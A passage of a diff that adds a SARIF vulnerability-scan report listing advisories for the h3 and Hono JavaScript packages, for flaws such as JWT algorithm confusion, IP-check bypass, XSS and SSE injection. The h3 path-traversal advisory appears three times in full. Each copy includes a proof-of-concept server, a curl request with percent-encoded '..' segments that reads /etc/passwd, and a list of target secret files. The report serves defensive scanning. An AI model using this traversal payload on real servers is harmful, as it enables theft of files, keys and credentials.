+                ]
+              }
+            },
+            {
+              "id": "GHSA-wr4h-v87w-p3r7",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "h3 has a Path Traversal via Percent-Encoded Dot Segments in serveStatic Allows Arbitrary File Read"
+              },
+              "fullDescription": {
+                "text": "## Summary\n\n`serveStatic()` in h3 is vulnerable to path traversal via percent-encoded dot segments (`%2e%2e`), allowing an unauthenticated attacker to read arbitrary files outside the intended static directory on Node.js deployments.\n\n## Details\n\nThe vulnerability exists in `src/utils/static.ts` at [line 86](https://github.com/h3js/h3/blob/52c82e18bb643d124b8b9ec3b1f62b081f044611/src/utils/static.ts#L86):\n\n```typescript\nconst originalId = decodeURI(withLeadingSlash(withoutTrailingSlash(event.url.pathname)));\n```\n\nOn Node.js, h3 uses srvx\u0026#39;s `FastURL` class to parse request URLs. Unlike the standard WHATWG `URL` parser, `FastURL` extracts the pathname via raw string slicing for performance — it does **not** normalize dot segments (`.` / `..`) or resolve percent-encoded equivalents (`%2e`).\n\nThis means a request to `/%2e%2e/` will have `event.url.pathname` return `/%2e%2e/` verbatim, whereas the standard `URL` parser would normalize it to `/` (resolving `..` upward).\n\nThe `serveStatic()` function then calls `decodeURI()` on this raw pathname, which decodes `%2e` to `.`, producing `/../`. The resulting path containing `../` traversal sequences is passed directly to the user-provided `getMeta()` and `getContents()` callbacks with no sanitization or traversal validation.\n\nWhen these callbacks perform filesystem operations (the intended and documented usage), the `../` sequences resolve against the filesystem, escaping the static root directory.\n\n\nBefore exploit:\n\n\u0026lt;img width=\u0026#34;761\u0026#34; height=\u0026#34;97\u0026#34; alt=\u0026#34;image\u0026#34; src=\u0026#34;https://github.com/user-attachments/assets/798f9d3d-f76c-4c29-aca3-5a6ccd3b3627\u0026#34; /\u0026gt;\n\n### Vulnerability chain\n\n```\n1. Attacker sends:    GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd\n2. FastURL.pathname:  /%2e%2e/%2e%2e/%2e%2e/etc/passwd  (raw, no normalization)\n3. decodeURI():       /../../../etc/passwd                (%2e decoded to .)\n4. getMeta(id):       id = \u0026#34;/../../../etc/passwd\u0026#34;         (no traversal check)\n5. path.join(root,id): /etc/passwd                        (.. resolved by OS)\n6. Response:          contents of /etc/passwd\n```\n\n## PoC\n\n### Vulnerable server (`server.ts`)\n\n```typescript\nimport { H3, serveStatic } from \u0026#34;h3\u0026#34;;\nimport { serve } from \u0026#34;h3/node\u0026#34;;\nimport { readFileSync, statSync } from \u0026#34;node:fs\u0026#34;;\nimport { join, resolve } from \u0026#34;node:path\u0026#34;;\n\nconst STATIC_ROOT = resolve(\u0026#34;./public\u0026#34;);\nconst app = new H3();\n\napp.all(\u0026#34;/**\u0026#34;, (event) =\u0026gt;\n  serveStatic(event, {\n    getMeta: (id) =\u0026gt; {\n      const filePath = join(STATIC_ROOT, id);\n      try {\n        const stat = statSync(filePath);\n        return { size: stat.size, mtime: stat.mtime };\n      } catch {\n        return undefined;\n      }\n    },\n    getContents: (id) =\u0026gt; {\n      const filePath = join(STATIC_ROOT, id);\n      try {\n        return readFileSync(filePath);\n      } catch {\n        return undefined;\n      }\n    },\n  })\n);\n\nserve({ fetch: app.fetch });\n```\n\n### Exploit\n\n```bash\n# Read /etc/passwd (adjust number of %2e%2e segments based on static root depth)\ncurl -s --path-as-is \u0026#34;http://localhost:3000/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\u0026#34;\n```\n\n### Result\n\n```\nroot:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n...\n```\n\n\nProof:\n\n\u0026lt;img width=\u0026#34;940\u0026#34; height=\u0026#34;703\u0026#34; alt=\u0026#34;image\u0026#34; src=\u0026#34;https://github.com/user-attachments/assets/f452e061-847a-424c-9dda-dfbf899687b1\u0026#34; /\u0026gt;\n\nPwned by **0xkakashi** \n\n\u0026lt;img width=\u0026#34;942\u0026#34; height=\u0026#34;74\u0026#34; alt=\u0026#34;image\u0026#34; src=\u0026#34;https://github.com/user-attachments/assets/db881519-1456-4e4c-a751-d8781b7abe95\u0026#34; /\u0026gt;\n\n\n## Impact\n\nAn unauthenticated remote attacker can read arbitrary files from the server\u0026#39;s filesystem by sending a crafted HTTP request with `%2e%2e` (percent-encoded `..`) path segments to any endpoint served by `serveStatic()`.\n\nThis affects any h3 v2.x application using `serveStatic()` running on Node.js (where the `FastURL` fast path is used). Applications running on runtimes that provide a pre-parsed `URL` object (e.g., Cloudflare Workers, Deno) may not be affected, as `FastURL`\u0026#39;s raw string slicing is bypassed.\n\n**Exploitable files include but are not limited to:**\n- `/etc/passwd`, `/etc/shadow` (if readable)\n- Application source code and configuration files\n- `.env` files containing secrets, API keys, database credentials\n- Private keys and certificates"
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/advisories/GHSA-wr4h-v87w-p3r7",
+              "help": {
+                "text": "Vulnerability GHSA-wr4h-v87w-p3r7\nSeverity: MEDIUM\nPackage: h3\nFixed Version: 2.0.1-rc.15, 1.15.6\nLink: [GHSA-wr4h-v87w-p3r7](https://github.com/advisories/GHSA-wr4h-v87w-p3r7)\n## Summary\n\n`serveStatic()` in h3 is vulnerable to path traversal via percent-encoded dot segments (`%2e%2e`), allowing an unauthenticated attacker to read arbitrary files outside the intended static directory on Node.js deployments.\n\n## Details\n\nThe vulnerability exists in `src/utils/static.ts` at [line 86](https://github.com/h3js/h3/blob/52c82e18bb643d124b8b9ec3b1f62b081f044611/src/utils/static.ts#L86):\n\n```typescript\nconst originalId = decodeURI(withLeadingSlash(withoutTrailingSlash(event.url.pathname)));\n```\n\nOn Node.js, h3 uses srvx's `FastURL` class to parse request URLs. Unlike the standard WHATWG `URL` parser, `FastURL` extracts the pathname via raw string slicing for performance — it does **not** normalize dot segments (`.` / `..`) or resolve percent-encoded equivalents (`%2e`).\n\nThis means a request to `/%2e%2e/` will have `event.url.pathname` return `/%2e%2e/` verbatim, whereas the standard `URL` parser would normalize it to `/` (resolving `..` upward).\n\nThe `serveStatic()` function then calls `decodeURI()` on this raw pathname, which decodes `%2e` to `.`, producing `/../`. The resulting path containing `../` traversal sequences is passed directly to the user-provided `getMeta()` and `getContents()` callbacks with no sanitization or traversal validation.\n\nWhen these callbacks perform filesystem operations (the intended and documented usage), the `../` sequences resolve against the filesystem, escaping the static root directory.\n\n\nBefore exploit:\n\n\u003cimg width=\"761\" height=\"97\" alt=\"image\" src=\"https://github.com/user-attachments/assets/798f9d3d-f76c-4c29-aca3-5a6ccd3b3627\" /\u003e\n\n### Vulnerability chain\n\n```\n1. Attacker sends:    GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd\n2. FastURL.pathname:  /%2e%2e/%2e%2e/%2e%2e/etc/passwd  (raw, no normalization)\n3. decodeURI():       /../../../etc/passwd                (%2e decoded to .)\n4. getMeta(id):       id = \"/../../../etc/passwd\"         (no traversal check)\n5. path.join(root,id): /etc/passwd                        (.. resolved by OS)\n6. Response:          contents of /etc/passwd\n```\n\n## PoC\n\n### Vulnerable server (`server.ts`)\n\n```typescript\nimport { H3, serveStatic } from \"h3\";\nimport { serve } from \"h3/node\";\nimport { readFileSync, statSync } from \"node:fs\";\nimport { join, resolve } from \"node:path\";\n\nconst STATIC_ROOT = resolve(\"./public\");\nconst app = new H3();\n\napp.all(\"/**\", (event) =\u003e\n  serveStatic(event, {\n    getMeta: (id) =\u003e {\n      const filePath = join(STATIC_ROOT, id);\n      try {\n        const stat = statSync(filePath);\n        return { size: stat.size, mtime: stat.mtime };\n      } catch {\n        return undefined;\n      }\n    },\n    getContents: (id) =\u003e {\n      const filePath = join(STATIC_ROOT, id);\n      try {\n        return readFileSync(filePath);\n      } catch {\n        return undefined;\n      }\n    },\n  })\n);\n\nserve({ fetch: app.fetch });\n```\n\n### Exploit\n\n```bash\n# Read /etc/passwd (adjust number of %2e%2e segments based on static root depth)\ncurl -s --path-as-is \"http://localhost:3000/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\"\n```\n\n### Result\n\n```\nroot:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n...\n```\n\n\nProof:\n\n\u003cimg width=\"940\" height=\"703\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f452e061-847a-424c-9dda-dfbf899687b1\" /\u003e\n\nPwned by **0xkakashi** \n\n\u003cimg width=\"942\" height=\"74\" alt=\"image\" src=\"https://github.com/user-attachments/assets/db881519-1456-4e4c-a751-d8781b7abe95\" /\u003e\n\n\n## Impact\n\nAn unauthenticated remote attacker can read arbitrary files from the server's filesystem by sending a crafted HTTP request with `%2e%2e` (percent-encoded `..`) path segments to any endpoint served by `serveStatic()`.\n\nThis affects any h3 v2.x application using `serveStatic()` running on Node.js (where the `FastURL` fast path is used). Applications running on runtimes that provide a pre-parsed `URL` object (e.g., Cloudflare Workers, Deno) may not be affected, as `FastURL`'s raw string slicing is bypassed.\n\n**Exploitable files include but are not limited to:**\n- `/etc/passwd`, `/etc/shadow` (if readable)\n- Application source code and configuration files\n- `.env` files containing secrets, API keys, database credentials\n- Private keys and certificates",
+                "markdown": "**Vulnerability GHSA-wr4h-v87w-p3r7**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|h3|2.0.1-rc.15, 1.15.6|[GHSA-wr4h-v87w-p3r7](https://github.com/advisories/GHSA-wr4h-v87w-p3r7)|\n\n## Summary\n\n`serveStatic()` in h3 is vulnerable to path traversal via percent-encoded dot segments (`%2e%2e`), allowing an unauthenticated attacker to read arbitrary files outside the intended static directory on Node.js deployments.\n\n## Details\n\nThe vulnerability exists in `src/utils/static.ts` at [line 86](https://github.com/h3js/h3/blob/52c82e18bb643d124b8b9ec3b1f62b081f044611/src/utils/static.ts#L86):\n\n```typescript\nconst originalId = decodeURI(withLeadingSlash(withoutTrailingSlash(event.url.pathname)));\n```\n\nOn Node.js, h3 uses srvx's `FastURL` class to parse request URLs. Unlike the standard WHATWG `URL` parser, `FastURL` extracts the pathname via raw string slicing for performance — it does **not** normalize dot segments (`.` / `..`) or resolve percent-encoded equivalents (`%2e`).\n\nThis means a request to `/%2e%2e/` will have `event.url.pathname` return `/%2e%2e/` verbatim, whereas the standard `URL` parser would normalize it to `/` (resolving `..` upward).\n\nThe `serveStatic()` function then calls `decodeURI()` on this raw pathname, which decodes `%2e` to `.`, producing `/../`. The resulting path containing `../` traversal sequences is passed directly to the user-provided `getMeta()` and `getContents()` callbacks with no sanitization or traversal validation.\n\nWhen these callbacks perform filesystem operations (the intended and documented usage), the `../` sequences resolve against the filesystem, escaping the static root directory.\n\n\nBefore exploit:\n\n\u003cimg width=\"761\" height=\"97\" alt=\"image\" src=\"https://github.com/user-attachments/assets/798f9d3d-f76c-4c29-aca3-5a6ccd3b3627\" /\u003e\n\n### Vulnerability chain\n\n```\n1. Attacker sends:    GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd\n2. FastURL.pathname:  /%2e%2e/%2e%2e/%2e%2e/etc/passwd  (raw, no normalization)\n3. decodeURI():       /../../../etc/passwd                (%2e decoded to .)\n4. getMeta(id):       id = \"/../../../etc/passwd\"         (no traversal check)\n5. path.join(root,id): /etc/passwd                        (.. resolved by OS)\n6. Response:          contents of /etc/passwd\n```\n\n## PoC\n\n### Vulnerable server (`server.ts`)\n\n```typescript\nimport { H3, serveStatic } from \"h3\";\nimport { serve } from \"h3/node\";\nimport { readFileSync, statSync } from \"node:fs\";\nimport { join, resolve } from \"node:path\";\n\nconst STATIC_ROOT = resolve(\"./public\");\nconst app = new H3();\n\napp.all(\"/**\", (event) =\u003e\n  serveStatic(event, {\n    getMeta: (id) =\u003e {\n      const filePath = join(STATIC_ROOT, id);\n      try {\n        const stat = statSync(filePath);\n        return { size: stat.size, mtime: stat.mtime };\n      } catch {\n        return undefined;\n      }\n    },\n    getContents: (id) =\u003e {\n      const filePath = join(STATIC_ROOT, id);\n      try {\n        return readFileSync(filePath);\n      } catch {\n        return undefined;\n      }\n    },\n  })\n);\n\nserve({ fetch: app.fetch });\n```\n\n### Exploit\n\n```bash\n# Read /etc/passwd (adjust number of %2e%2e segments based on static root depth)\ncurl -s --path-as-is \"http://localhost:3000/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\"\n```\n\n### Result\n\n```\nroot:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n...\n```\n\n\nProof:\n\n\u003cimg width=\"940\" height=\"703\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f452e061-847a-424c-9dda-dfbf899687b1\" /\u003e\n\nPwned by **0xkakashi** \n\n\u003cimg width=\"942\" height=\"74\" alt=\"image\" src=\"https://github.com/user-attachments/assets/db881519-1456-4e4c-a751-d8781b7abe95\" /\u003e\n\n\n## Impact\n\nAn unauthenticated remote attacker can read arbitrary files from the server's filesystem by sending a crafted HTTP request with `%2e%2e` (percent-encoded `..`) path segments to any endpoint served by `serveStatic()`.\n\nThis affects any h3 v2.x application using `serveStatic()` running on Node.js (where the `FastURL` fast path is used). Applications running on runtimes that provide a pre-parsed `URL` object (e.g., Cloudflare Workers, Deno) may not be affected, as `FastURL`'s raw string slicing is bypassed.\n\n**Exploitable files include but are not limited to:**\n- `/etc/passwd`, `/etc/shadow` (if readable)\n- Application source code and configuration files\n- `.env` files containing secrets, API keys, database credentials\n- Private keys and certificates"
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "5.9",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-22817",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Hono JWT Middleware\u0026#39;s JWT Algorithm Confusion via Unsafe Default (HS256) Allows Token Forgery and Auth Bypass"
+              },
+              "fullDescription": {
+                "text": "Hono is a Web application framework that provides support for any JavaScript runtime. Prior to 4.11.4, there is a flaw in Hono’s JWK/JWKS JWT verification middleware allowed the JWT header’s alg value to influence signature verification when the selected JWK did not explicitly specify an algorithm. This could enable JWT algorithm confusion and, in certain configurations, allow forged tokens to be accepted. As part of this fix, the JWT middleware now requires the alg option to be explicitly specified. This prevents algorithm confusion by ensuring that the verification algorithm is not derived from untrusted JWT header values. This vulnerability is fixed in 4.11.4."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-22817",
+              "help": {
+                "text": "Vulnerability CVE-2026-22817\nSeverity: HIGH\nPackage: hono\nFixed Version: 4.11.4\nLink: [CVE-2026-22817](https://avd.aquasec.com/nvd/cve-2026-22817)\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to 4.11.4, there is a flaw in Hono’s JWK/JWKS JWT verification middleware allowed the JWT header’s alg value to influence signature verification when the selected JWK did not explicitly specify an algorithm. This could enable JWT algorithm confusion and, in certain configurations, allow forged tokens to be accepted. As part of this fix, the JWT middleware now requires the alg option to be explicitly specified. This prevents algorithm confusion by ensuring that the verification algorithm is not derived from untrusted JWT header values. This vulnerability is fixed in 4.11.4.",
+                "markdown": "**Vulnerability CVE-2026-22817**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|hono|4.11.4|[CVE-2026-22817](https://avd.aquasec.com/nvd/cve-2026-22817)|\n\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to 4.11.4, there is a flaw in Hono’s JWK/JWKS JWT verification middleware allowed the JWT header’s alg value to influence signature verification when the selected JWK did not explicitly specify an algorithm. This could enable JWT algorithm confusion and, in certain configurations, allow forged tokens to be accepted. As part of this fix, the JWT middleware now requires the alg option to be explicitly specified. This prevents algorithm confusion by ensuring that the verification algorithm is not derived from untrusted JWT header values. This vulnerability is fixed in 4.11.4."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "8.2",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-22818",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Hono JWK Auth Middleware has JWT algorithm confusion when JWK lacks \u0026#34;alg\u0026#34; (untrusted header.alg fallback)"
+              },
+              "fullDescription": {
+                "text": "Hono is a Web application framework that provides support for any JavaScript runtime. Prior to 4.11.4, there is a flaw in Hono’s JWK/JWKS JWT verification middleware allowed the algorithm specified in the JWT header to influence signature verification when the selected JWK did not explicitly define an algorithm. This could enable JWT algorithm confusion and, in certain configurations, allow forged tokens to be accepted. The JWK/JWKS JWT verification middleware has been updated to require an explicit allowlist of asymmetric algorithms when verifying tokens. The middleware no longer derives the verification algorithm from untrusted JWT header values. This vulnerability is fixed in 4.11.4."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-22818",
+              "help": {
+                "text": "Vulnerability CVE-2026-22818\nSeverity: HIGH\nPackage: hono\nFixed Version: 4.11.4\nLink: [CVE-2026-22818](https://avd.aquasec.com/nvd/cve-2026-22818)\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to 4.11.4, there is a flaw in Hono’s JWK/JWKS JWT verification middleware allowed the algorithm specified in the JWT header to influence signature verification when the selected JWK did not explicitly define an algorithm. This could enable JWT algorithm confusion and, in certain configurations, allow forged tokens to be accepted. The JWK/JWKS JWT verification middleware has been updated to require an explicit allowlist of asymmetric algorithms when verifying tokens. The middleware no longer derives the verification algorithm from untrusted JWT header values. This vulnerability is fixed in 4.11.4.",
+                "markdown": "**Vulnerability CVE-2026-22818**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|hono|4.11.4|[CVE-2026-22818](https://avd.aquasec.com/nvd/cve-2026-22818)|\n\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to 4.11.4, there is a flaw in Hono’s JWK/JWKS JWT verification middleware allowed the algorithm specified in the JWT header to influence signature verification when the selected JWK did not explicitly define an algorithm. This could enable JWT algorithm confusion and, in certain configurations, allow forged tokens to be accepted. The JWK/JWKS JWT verification middleware has been updated to require an explicit allowlist of asymmetric algorithms when verifying tokens. The middleware no longer derives the verification algorithm from untrusted JWT header values. This vulnerability is fixed in 4.11.4."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "8.2",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-29045",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Hono vulnerable to arbitrary file access via serveStatic vulnerability "
+              },
+              "fullDescription": {
+                "text": "Hono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.12.4, when using serveStatic together with route-based middleware protections (e.g. app.use(\u0026#39;/admin/*\u0026#39;, ...)), inconsistent URL decoding allowed protected static resources to be accessed without authorization. The router used decodeURI, while serveStatic used decodeURIComponent. This mismatch allowed paths containing encoded slashes (%2F) to bypass middleware protections while still resolving to the intended filesystem path. This issue has been patched in version 4.12.4."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-29045",
+              "help": {
+                "text": "Vulnerability CVE-2026-29045\nSeverity: HIGH\nPackage: hono\nFixed Version: 4.12.4\nLink: [CVE-2026-29045](https://avd.aquasec.com/nvd/cve-2026-29045)\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.12.4, when using serveStatic together with route-based middleware protections (e.g. app.use('/admin/*', ...)), inconsistent URL decoding allowed protected static resources to be accessed without authorization. The router used decodeURI, while serveStatic used decodeURIComponent. This mismatch allowed paths containing encoded slashes (%2F) to bypass middleware protections while still resolving to the intended filesystem path. This issue has been patched in version 4.12.4.",
+                "markdown": "**Vulnerability CVE-2026-29045**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|hono|4.12.4|[CVE-2026-29045](https://avd.aquasec.com/nvd/cve-2026-29045)|\n\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.12.4, when using serveStatic together with route-based middleware protections (e.g. app.use('/admin/*', ...)), inconsistent URL decoding allowed protected static resources to be accessed without authorization. The router used decodeURI, while serveStatic used decodeURIComponent. This mismatch allowed paths containing encoded slashes (%2F) to bypass middleware protections while still resolving to the intended filesystem path. This issue has been patched in version 4.12.4."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-24398",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Hono IPv4 address validation bypass in IP Restriction Middleware allows IP spoofing"
+              },
+              "fullDescription": {
+                "text": "Hono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.11.7, IP Restriction Middleware in Hono is vulnerable to an IP address validation bypass. The `IPV4_REGEX` pattern and `convertIPv4ToBinary` function in `src/utils/ipaddr.ts` do not properly validate that IPv4 octet values are within the valid range of 0-255, allowing attackers to craft malformed IP addresses that bypass IP-based access controls. Version 4.11.7 contains a patch for the issue."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-24398",
+              "help": {
+                "text": "Vulnerability CVE-2026-24398\nSeverity: MEDIUM\nPackage: hono\nFixed Version: 4.11.7\nLink: [CVE-2026-24398](https://avd.aquasec.com/nvd/cve-2026-24398)\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.11.7, IP Restriction Middleware in Hono is vulnerable to an IP address validation bypass. The `IPV4_REGEX` pattern and `convertIPv4ToBinary` function in `src/utils/ipaddr.ts` do not properly validate that IPv4 octet values are within the valid range of 0-255, allowing attackers to craft malformed IP addresses that bypass IP-based access controls. Version 4.11.7 contains a patch for the issue.",
+                "markdown": "**Vulnerability CVE-2026-24398**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|hono|4.11.7|[CVE-2026-24398](https://avd.aquasec.com/nvd/cve-2026-24398)|\n\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.11.7, IP Restriction Middleware in Hono is vulnerable to an IP address validation bypass. The `IPV4_REGEX` pattern and `convertIPv4ToBinary` function in `src/utils/ipaddr.ts` do not properly validate that IPv4 octet values are within the valid range of 0-255, allowing attackers to craft malformed IP addresses that bypass IP-based access controls. Version 4.11.7 contains a patch for the issue."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "4.8",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-24472",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Hono cache middleware ignores \u0026#34;Cache-Control: private\u0026#34; leading to Web Cache Deception"
+              },
+              "fullDescription": {
+                "text": "Hono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.11.7, Cache Middleware contains an information disclosure vulnerability caused by improper handling of HTTP cache control directives. The middleware does not respect standard cache control headers such as `Cache-Control: private` or `Cache-Control: no-store`, which may result in private or authenticated responses being cached and subsequently exposed to unauthorized users. Version 4.11.7 has a patch for the issue."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-24472",
+              "help": {
+                "text": "Vulnerability CVE-2026-24472\nSeverity: MEDIUM\nPackage: hono\nFixed Version: 4.11.7\nLink: [CVE-2026-24472](https://avd.aquasec.com/nvd/cve-2026-24472)\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.11.7, Cache Middleware contains an information disclosure vulnerability caused by improper handling of HTTP cache control directives. The middleware does not respect standard cache control headers such as `Cache-Control: private` or `Cache-Control: no-store`, which may result in private or authenticated responses being cached and subsequently exposed to unauthorized users. Version 4.11.7 has a patch for the issue.",
+                "markdown": "**Vulnerability CVE-2026-24472**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|hono|4.11.7|[CVE-2026-24472](https://avd.aquasec.com/nvd/cve-2026-24472)|\n\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.11.7, Cache Middleware contains an information disclosure vulnerability caused by improper handling of HTTP cache control directives. The middleware does not respect standard cache control headers such as `Cache-Control: private` or `Cache-Control: no-store`, which may result in private or authenticated responses being cached and subsequently exposed to unauthorized users. Version 4.11.7 has a patch for the issue."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "5.3",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-24473",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Hono has an Arbitrary Key Read in Serve static Middleware (Cloudflare Workers Adapter)"
+              },
+              "fullDescription": {
+                "text": "Hono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.11.7, Serve static Middleware for the Cloudflare Workers adapter contains an information disclosure vulnerability that may allow attackers to read arbitrary keys from the Workers environment. Improper validation of user-controlled paths can result in unintended access to internal asset keys. Version 4.11.7 contains a patch for the issue."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-24473",
+              "help": {
+                "text": "Vulnerability CVE-2026-24473\nSeverity: MEDIUM\nPackage: hono\nFixed Version: 4.11.7\nLink: [CVE-2026-24473](https://avd.aquasec.com/nvd/cve-2026-24473)\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.11.7, Serve static Middleware for the Cloudflare Workers adapter contains an information disclosure vulnerability that may allow attackers to read arbitrary keys from the Workers environment. Improper validation of user-controlled paths can result in unintended access to internal asset keys. Version 4.11.7 contains a patch for the issue.",
+                "markdown": "**Vulnerability CVE-2026-24473**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|hono|4.11.7|[CVE-2026-24473](https://avd.aquasec.com/nvd/cve-2026-24473)|\n\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.11.7, Serve static Middleware for the Cloudflare Workers adapter contains an information disclosure vulnerability that may allow attackers to read arbitrary keys from the Workers environment. Improper validation of user-controlled paths can result in unintended access to internal asset keys. Version 4.11.7 contains a patch for the issue."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "5.3",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-24771",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Hono vulnerable to XSS through ErrorBoundary component "
+              },
+              "fullDescription": {
+                "text": "Hono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.11.7, a Cross-Site Scripting (XSS) vulnerability exists in the `ErrorBoundary` component of the hono/jsx library. Under certain usage patterns, untrusted user-controlled strings may be rendered as raw HTML, allowing arbitrary script execution in the victim\u0026#39;s browser. Version 4.11.7 patches the issue."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-24771",
+              "help": {
+                "text": "Vulnerability CVE-2026-24771\nSeverity: MEDIUM\nPackage: hono\nFixed Version: 4.11.7\nLink: [CVE-2026-24771](https://avd.aquasec.com/nvd/cve-2026-24771)\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.11.7, a Cross-Site Scripting (XSS) vulnerability exists in the `ErrorBoundary` component of the hono/jsx library. Under certain usage patterns, untrusted user-controlled strings may be rendered as raw HTML, allowing arbitrary script execution in the victim's browser. Version 4.11.7 patches the issue.",
+                "markdown": "**Vulnerability CVE-2026-24771**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|hono|4.11.7|[CVE-2026-24771](https://avd.aquasec.com/nvd/cve-2026-24771)|\n\nHono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.11.7, a Cross-Site Scripting (XSS) vulnerability exists in the `ErrorBoundary` component of the hono/jsx library. Under certain usage patterns, untrusted user-controlled strings may be rendered as raw HTML, allowing arbitrary script execution in the victim's browser. Version 4.11.7 patches the issue."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "4.7",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-29085",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Hono Vulnerable to SSE Control Field Injection via CR/LF in writeSSE()"
+              },
+              "fullDescription": {
+                "text": "Hono is a Web application framework that provides support for any JavaScript runtime. Prior to version 4.12.4, when using streamSSE() in Streaming Helper, the event, id, and retry fields were not validated for carriage return (\\r) or newline (\\n) characters. Because the SSE protocol uses line breaks as field delimiters, this could allow injection of additional SSE fields within the same event frame if untrusted input was passed into these fields. This issue has been patched in version 4.12.4."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-29085",
+              "help": {
